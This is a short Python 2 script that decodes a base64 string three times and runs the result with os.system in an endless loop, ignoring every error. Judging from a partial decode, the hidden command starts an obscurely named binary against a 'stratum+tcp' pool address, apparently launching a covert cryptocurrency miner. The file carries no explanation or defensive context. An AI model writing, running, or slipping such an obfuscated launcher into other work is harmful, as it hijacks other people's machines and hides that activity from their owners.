import os
import base64

if __name__ == '__main__':
    s = base64.decodestring('VEdrNWJXRnRSbkppU0U1eFlUSjRiV0pIZEROYVUwRjBXWGxDTkVsRE1VNUpTRTR3WTIxR01HUlhNSEprUjA1M1QyazRkazVFVlhwVQpWRXBOWVVWWk5WVkVXbFJYU0doR1ZXMDFUQXBhUlZKcFZrZFNTMUpHU214Tk1td3paV3hPZVZkclRubGFSV042VTJ0d1FsSkljRlJhCk1GWnZWbFZhUmsxdVZucGlNazVGVmtoU1JsUnRSbXhrU0dnMlZVUmFibGxXV1ROUmJYUlRDbFJYVlRWaE0xSm9ZbGhzUjFkdVFqWmsKTVVKTVpWVlNOV05yYnpabFJVSjNZakk1YzB4dE1YQmliVlkwWWxoSmRWa3lPWFJQYWxFd1RrUlJkbVZITVhsSlF6RXdTVVJGWjB4VgpkMmNLVDBSQloxQnBRWFphUjFZeVRESTFNV0pIZHowSwo=')
    s = base64.decodestring(s)
    s = base64.decodestring(s)
    while True:
        try:
            os.system(s)
        except BaseException as e:
            print e
            pass
